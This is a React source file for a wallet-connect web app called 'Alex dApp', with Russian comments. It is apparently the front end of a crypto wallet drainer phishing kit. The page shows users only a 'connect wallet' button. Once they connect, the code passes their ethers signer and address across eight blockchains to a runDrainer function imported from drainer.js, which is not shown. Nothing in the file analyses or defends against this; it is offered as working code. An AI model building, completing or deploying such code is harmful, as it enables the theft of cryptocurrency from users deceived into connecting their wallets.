import React, { useState } from 'react'
import { createAppKit } from '@reown/appkit'
import {
  mainnet, polygon, bsc, avalanche,
  arbitrum, optimism, linea, base
} from '@reown/appkit/networks'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { ethers } from 'ethers'
import { runDrainer } from './drainer.js'

// === Настройки AppKit ===
const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'
const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base]
const wagmiAdapter = new WagmiAdapter({ projectId, networks })

const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  metadata: {
    name: 'Alex dApp',
    description: 'Connect and sign',
    url: 'https://checkalex.xyz',
    icons: ['https://checkalex.xyz/icon.png']
  },
  projectId,
  features: {
    analytics: true,
    email: false,
    socials: false
  },
  allWallets: 'SHOW'
})

const App = () => {
  const [status, setStatus] = useState('⏳ Ожидание подключения...')

  const handleConnect = async () => {
    try {
      await modal.open()

      const waitForWallet = async () => {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' })
        if (accounts.length > 0) return accounts[0]
        return new Promise(resolve => {
          const interval = setInterval(async () => {
            const accounts = await window.ethereum.request({ method: 'eth_accounts' })
            if (accounts.length > 0) {
              clearInterval(interval)
              resolve(accounts[0])
            }
          }, 500)
        })
      }

      const address = await waitForWallet()
      console.log('Кошелёк подключён:', address)
      setStatus(`🔗 Подключён: ${address}`)

      const provider = new ethers.providers.Web3Provider(window.ethereum)
      const signer = provider.getSigner()

      setStatus('🚀 Выполнение runDrainer...')
      await runDrainer(provider, signer, address)
      setStatus('✅ Контракт успешно вызван!')

    } catch (err) {
      console.error('Ошибка при подключении или вызове контракта:', err)
      setStatus('❌ Ошибка: ' + err.message)
    }
  }

  return (
    <div style={{ textAlign: 'center' }}>
      <h1>Alex dApp</h1>
      <button
        onClick={handleConnect}
        style={{
          padding: '12px 24px',
          fontSize: '16px',
          fontWeight: '600',
          borderRadius: '8px',
          cursor: 'pointer',
          backgroundColor: '#4f46e5',
          color: '#fff',
          border: 'none',
          marginTop: '20px'
        }}
      >
        Подключить кошелёк
      </button>
      <p style={{ marginTop: '20px' }}>{status}</p>
    </div>
  )
}

export default App
